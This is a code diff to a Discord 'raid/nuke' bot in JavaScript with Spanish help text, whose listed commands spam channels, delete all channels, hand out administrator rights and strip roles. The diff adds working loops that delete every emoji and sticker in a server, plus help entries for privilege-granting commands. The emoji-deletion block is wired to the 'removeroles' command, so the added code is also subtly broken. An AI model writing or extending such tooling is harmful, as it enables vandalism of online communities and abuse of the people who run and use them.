@@ -14,13 +14,17 @@ client.on(`messageCreate`, async(msg)=>{
             .addFields(
                 {name:prefix+'raid',value:'Crea canales y hace spam en ellos.'},
                 {name:prefix+'nuke',value:'Elimina todos los canales del servidor.'},
+                {name:prefix+'getadmin',value:'Obtén permisos de administrador.'},
+                {name:prefix+'adminall',value:'Todos reciben permisos de administrador.'},
                 {name:prefix+'massping',value:'Hace spam en todos los canales de texto.'},
                 {name:prefix+'renamechannels',value:'Renombra todos los canales.'},
                 {name:prefix+'createwebhooks',value:'Crea webhooks.'},
                 {name:prefix+'spamwebhooks',value:'Hace spam en todas las webhooks del servidor.'},
                 {name:prefix+'createroles',value:'Crea roles.'},
                 {name:prefix+'removeroles',value:'Elimina todos los roles posibles del servidor.'},
-                {name:prefix+'renameroles',value:'Renombra todos los roles posibles.'}
+                {name:prefix+'renameroles',value:'Renombra todos los roles posibles.'},
+                {name:prefix+'removestickers',value:'Elimina todos los stickers posibles del servidor.'},
+                {name:prefix+'removeemojis',value:'Elimina todos los emojis posibles del servidor.'}
             )
         ]});
     };
@@ -137,6 +141,30 @@ client.on(`messageCreate`, async(msg)=>{
                 console.log(`Se eliminó el rol ${rol.name} con ID ${rol.id}`);
             } catch (e) {
                 console.log(`No se pudo eliminar el rol ${rol.name}\nMensaje de error: ${e}`)
+            }
+        };
+    };
+    if(msg.content === prefix+"removeroles"){
+        await msg.delete().catch((e)=>{});
+        let emojiss = await msg.guild.emojis.fetch();
+        for (const emj of emojiss.values()) {
+            try {
+                await emj.delete();
+                console.log(`Se eliminó el emoji ${emj.name} con ID ${emj.id}`);
+            } catch (e) {
+                console.log(`No se pudo eliminar el emoji ${emj.name}\nMensaje de error: ${e}`)
+            }
+        };
+    };
+    if(msg.content === prefix+"removestickers"){
+        await msg.delete().catch((e)=>{});
+        let stickerss = await msg.guild.stickers.fetch();
+        for (const stickerxd of stickerss.values()) {
+            try {
+                await stickerxd.delete();
+                console.log(`Se eliminó el sticker ${stickerxd.name} con ID ${stickerxd.id}`);
+            } catch (e) {
+                console.log(`No se pudo eliminar el sticker ${stickerxd.name}\nMensaje de error: ${e}`)
             }
         };
     };
